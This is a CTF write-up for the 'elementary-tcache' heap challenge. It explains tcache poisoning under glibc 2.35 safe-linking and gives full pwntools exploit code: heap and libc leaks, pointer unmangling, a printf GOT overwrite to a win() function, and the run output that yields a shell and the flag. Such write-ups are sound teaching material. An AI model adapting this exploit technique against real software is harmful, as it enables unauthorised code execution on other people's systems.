## Question 

It's been years since I played with the heap. Looks like I still got my mojo, this is too easy!!!! ...or is it ??

``nc 34.90.214.14 1337``

[heapchall](heapchall)

## Solution

The binary has ``partial RELRO, stack canaries, NX`` enabled but ``no pie``. Given the title ``elementary-tcache``, and the included ``libc``, its most likely going to be [tcache poisoning](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/tcache_poisoning.c) but we need to determine the ``libc`` version to understand what glibc protection mechanisms like [safe-linking](https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41) that might be in effect. 

```
 pwn checksec ./heapchall
[*] '/root/workspace/nitectf/heapchall/heapchall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Using [pwninit](https://github.com/io12/pwninit), we identified the ``libc`` as [libc 2.35](https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.35-0ubuntu3.1_amd64.deb). This means it will have the most current protection mechanisms on the glibc. 

We first setup a skeleton to begin playing with the binary 

```python
from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)
r = ROP(e)
libc = ELF('./libc.so.6',checksec=False)

gs = '''
set resolve-heap-via-heuristic on
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('34.90.214.14',1337)
    else:
        return process(e.path)


def allocate(slot,sz):
   log.info('Allocating %i,%i' %(slot,sz))
   p.recvuntil(b'Option:')
   p.sendline(b'1')
   p.recvuntil(b'Slot:')
   p.sendline(b'%i' %slot)
   p.recvuntil(b'Size:')
   p.sendline(b'%i' %sz)

def edit(slot,content):
   log.info('Editing slot: %i with %s' %(slot,content))
   p.recvuntil(b'Option:')
   p.sendline(b'2')
   p.recvuntil(b'Slot:')
   p.sendline(b'%i' %slot)
   p.recvuntil(b'content:')
   p.sendline(content)

def free(slot):
   log.info('Freeing slot: %i' %slot)
   p.recvuntil(b'Option:')
   p.sendline(b'3') 
   p.recvuntil(b'Slot:')
   p.sendline(b'%i' %slot)

def view(slot):
   p.recvuntil(b'Option:')
   p.sendline(b'4')
   p.recvuntil(b'Slot:')
   p.sendline(b'%i' %slot)
   return p.recvline()

def leak(slot):
   leak=view(slot).lstrip(b' ').rstrip(b'\n')
   try:
      leak=u64(leak+b'\x00'*(8-len(leak)))
      log.info("Leaking slot: %i with %s" %(slot,hex(leak)))
      return leak
   except:
      return 0
```

Right away, we see we can allocate(), free(), and then view the free()d addresses, which now reside in the ``tcachebins``. We notice that bin0 holds the ``heap address >>> 12`` that is used for ``pointer mangling``. We can unmangle the remaining pointers by XORing the ``fd`` found in the first 8 bytes with the leak from the first bin. Below we use it to unmask the address ``0x12f62a0``  from the XOR(bin0_leak,bin1_leak). Bin7, held a pointer to ``libc``. While we printed in out after discovering it, we did not need to use it in the final exploit.  

```python
p = start()
for i in range(0,10):
  allocate(i,128)

for i in range(0,10):
  free(i)

bin0_leak = leak(0)
bin1_leak = leak(1)
bin7_leak = leak(7)

libc.address=bin7_leak-2202848
heap_leak=(bin0_leak ^ bin1_leak)

log.info("Libc Leak Found: %s" %hex(libc.address))
log.info("Tcache Leak Found: %s" %hex(heap_leak))
```

```
[*] Tcache Leak Found: 0x12f62a0   
│pwndbg> tcachebins 
tcachebins
│0x90 [  7]: 0x12f6600 —▸ 0x12f6570 —▸ 0x12f64e0 —▸ 0x12f6450 —▸ 0x12f63c0 —▸ 0x12f6330 —▸ 0x12f62a0 ◂— 0x0
```

The only next thing we had to discover was finding an address that satisfied the conditions ``addr & 0xf == 0`` since the address needed to be ``MALLOC ALIGN``ed. We quickly check and see which addresses we can use to overwrite in the ``GOT`` and see ``stdout, stdin, stderr, puts, setbuf, printf, scanf`` are all correctly ``MALLOC ALIGN``ed. 

```
>>> from pwn import *
>>> e = ELF('./heapchall',checksec=False)
>>> for x in e.got:
...     if (e.got[x] & 0xf == 0):
...        print(x)
... 
__libc_start_main
stdout
stdin
stderr
puts
setbuf
printf
__isoc99_scanf
```

We will want to overwrite one of these addresses with the ``win`` function below.

```
00401216  int64_t win()

00401216  {
00401228      puts("Winner winner, chicken dinner!");
0040123e      return system("/bin/sh");
00401234  }
```

Since the ``win`` function calls ``puts``, we cannot use the ``puts`` address or we would never return to system. So we chose to overwrite the ``printf`` address. We then allocate two addresses until we allocate the ``fd`` that now points to the got entry for ``printf``. We then overwrite the entry with the address of our ``win function``

```
overwrite_addr = e.got['printf']
encrypted_ptr = (bin0_leak ^ overwrite_addr)
edit(6,p64(encrypted_ptr))

allocate(0,128)
allocate(1,128)

edit(1,p64(e.sym['win']))
```

Putting it all together, we run it and receive our flag. 

```
└─# python3 pwn-heap.py BIN=./heapchall REMOTE
[*] Loaded 5 cached gadgets for './heapchall'
[+] Opening connection to 34.90.214.14 on port 1337: Done
[*] Allocating 0,128
[*] Allocating 1,128
[*] Allocating 2,128
[*] Allocating 3,128
[*] Allocating 4,128
[*] Allocating 5,128
[*] Allocating 6,128
[*] Allocating 7,128
[*] Allocating 8,128
[*] Allocating 9,128
[*] Freeing slot: 0
[*] Freeing slot: 1
[*] Freeing slot: 2
[*] Freeing slot: 3
[*] Freeing slot: 4
[*] Freeing slot: 5
[*] Freeing slot: 6
[*] Freeing slot: 7
[*] Freeing slot: 8
[*] Freeing slot: 9
[*] Leaking slot: 0 with 0x2082
[*] Leaking slot: 1 with 0x2080222
[*] Leaking slot: 7 with 0x7f5fdd2d9ce0
[*] Libc Leak Found: 0x7f5fdd0c0000
[*] Tcache Leak Found: 0x20822a0
[*] Editing slot: 6 with b'\xc2`@\x00\x00\x00\x00\x00'
[*] Allocating 0,128
[*] Allocating 1,128
[*] Editing slot: 1 with b'\x16\x12@\x00\x00\x00\x00\x00'
[*] Switching to interactive mode
 Winner winner, chicken dinner!
$ cat flag.txt
nite{s4f3_l1nk1ng_1s_th3_futur3_0ld_m4n}
```
